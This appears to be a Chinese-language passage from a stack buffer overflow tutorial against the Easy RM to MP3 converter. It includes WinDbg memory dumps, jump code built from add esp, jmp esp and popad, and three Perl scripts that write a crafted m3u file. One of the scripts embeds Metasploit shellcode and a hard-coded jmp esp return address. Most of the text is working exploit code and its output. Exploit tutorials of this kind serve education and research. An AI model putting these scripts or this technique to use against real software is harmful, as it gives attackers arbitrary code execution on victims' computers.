### 优化后的文本

#### 内存数据示例
```
000ff840 90 90 90 90 90 90 90 90-00 90 90 90 90 90 90 90 ................
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
```

#### 第二步：将跳转代码写入ESP
我们需要在ESP中放入跳转代码，其目的是跳转到ESP+281。这个过程与写入汇编代码并将其转换为机器码类似。跳转到ESP+281的步骤如下：
1. 将ESP寄存器加281（即0x119）。
2. 执行`jmp esp`。

为了确保没有null byte或其他限制字符，我们可以通过以下汇编指令实现：
- `add esp, 0x5e` (三次)
- `jmp esp`

使用Windbg获取这些指令的机器码：
```
0:014> a
7c901211 add esp,0x5e
7c901214 add esp,0x5e
7c901217 add esp,0x5e
7c90121a jmp esp
0:014> u 7c901211
ntdll!DbgBreakPoint+0x3:
7c901211 83c45e add esp,5Eh
7c901214 83c45e add esp,5Eh
7c901217 83c45e add esp,5Eh
7c90121a ffe4 jmp esp
```

因此，整个跳转代码的机器码为：`0x83, 0xc4, 0x5e, 0x83, 0xc4, 0x5e, 0x83, 0xc4, 0x5e, 0xff, 0xe4`。

#### 编写脚本生成m3u文件
```perl
my $file = "test1.m3u";
my $buffersize = 26094;
my $junk = "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc"; # 位置300
my $restofbuffer = "A" x ($buffersize - (length($junk) + length($nop) + length($shellcode)));
my $eip = "BBBB";
my $preshellcode = "X" x 4;
my $jumpcode = "\x83\xc4\x5e" . # add esp,0x5e
               "\x83\xc4\x5e" . # add esp,0x5e
               "\x83\xc4\x5e" . # add esp,0x5e
               "\xff\xe4";      # jmp esp
my $nop2 = "\x90" x 10; # 仅用于视觉分隔
my $buffer = $junk . $nop . $shellcode . $restofbuffer;

print "Size of buffer: " . length($buffer) . "\n";
open(my $FILE, ">", $file) or die "Cannot open file: $!";
print $FILE $buffer . $eip . $preshellcode . $jumpcode;
close($FILE);
print "m3u File Created successfully\n";
```

#### 跳转代码执行流程
当shellcode被调用时，ESP将指向NOPs（从000ff842到000ff873）。shellcode起始于000ff874。

#### 测试结果
执行m3u文件后，shellcode将正确执行（中断）。（EIP=0x000ff874=shellcode入口）

#### 替换中断为实际shellcode
将中断替换为实际shellcode，并用NOPs替换掉A's。这样可以跳入更大的空间，因此只需使用跳转偏移量为188（2 x 5e）的jumpcode即可。

```perl
my $file = "test1.m3u";
my $buffersize = 26094;
my $junk = "\x90" x 200;
my $nop = "\x90" x 50;
# windows/exec - 303 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode = "\x89\xe2\xd9\xeb\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49" .
                "\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
                "\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
                "\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
                "\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d" .
                "\x38\x51\x54\x45\x50\x43\x30\x45\x50\x4c\x4b\x51\x55\x47" .
                "\x4c\x4c\x4b\x43\x4c\x44\x45\x43\x48\x43\x31\x4a\x4f\x4c" .
                "\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x45\x51\x4a" .
                "\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x46" .
                "\x51\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x44\x34\x45" .
                "\x57\x49\x51\x49\x5a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c" .
                "\x34\x47\x4b\x50\x54\x51\x34\x45\x54\x44\x35\x4d\x35\x4c" .
                "\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44" .
                "\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
                "\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4b\x39\x51\x4c\x46" .
                "\x44\x45\x54\x48\x43\x51\x4f\x46\x51\x4c\x36\x43\x50\x50" .
                "\x56\x43\x54\x4c\x4b\x47\x36\x46\x50\x4c\x4b\x47\x30\x44" .
                "\x4c\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x44" .
                "\x48\x4d\x59\x4c\x38\x4d\x53\x49\x50\x42\x4a\x46\x30\x45" .
                "\x38\x4c\x30\x4c\x4a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b" .
                "\x4e\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x42\x43\x43" .
                "\x51\x42\x4c\x45\x33\x45\x50\x41\x41";
my $restofbuffer = "\x90" x ($buffersize - (length($junk) + length($nop) + length($shellcode)));
my $eip = pack('V', 0x01ccf23a); # jmp esp from MSRMCcodec02.dll
my $preshellcode = "X" x 4;
my $jumpcode = "\x83\xc4\x5e" . # add esp,0x5e
               "\x83\xc4\x5e" . # add esp,0x5e
               "\xff\xe4";      # jmp esp
my $buffer = $junk . $nop . $shellcode . $restofbuffer;

print "Size of buffer: " . length($buffer) . "\n";
open(my $FILE, ">", $file) or die "Cannot open file: $!";
print $FILE $buffer . $eip . $preshellcode . $jumpcode;
close($FILE);
print "m3u File Created successfully\n";
```

#### 其他跳转方式
- **popad** 指令也可以帮助我们跳转到shellcode。`popad` 从栈（ESP）中弹出DWORD数据，并赋予各通用寄存器。每次加载寄存器时，ESP都会递增。一次`popad`将用掉ESP中的32字节，并有序地将其pop到各寄存器中。`popad`的机器码是`0x61`。

假设你需要跳转40字节，而你只有两字节可以用于跳转，那么你可以使用两个`popad`指令来使ESP指向shellcode（以一串NOP指令开头以弥补我们两次跳过的32 bytes – 40 bytes大小的空间）。让我们再次以Easy RM to MP3漏洞来演示这项技术：

```perl
my $file = "test1.m3u";
my $buffersize = 26094;
my $junk = "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc"; # 位置300
my $restofbuffer = "A" x ($buffersize - (length($junk) + length($nop) + length($shellcode)));
my $eip = "BBBB";
my $preshellcode = "X" x 4;
my $jumpcode = "\x61" . # popad
               "\x61";  # popad
my $nop2 = "\x90" x 10; # 仅用于视觉分隔
my $buffer = $junk . $nop . $shellcode . $restofbuffer;

print "Size of buffer: " . length($buffer) . "\n";
open(my $FILE, ">", $file) or die "Cannot open file: $!";
print $FILE $buffer . $eip . $preshellcode . $jumpcode;
close($FILE);
print "m3u File Created successfully\n";
```

通过这种方式，我们可以有效地控制ESP指针并执行我们的shellcode。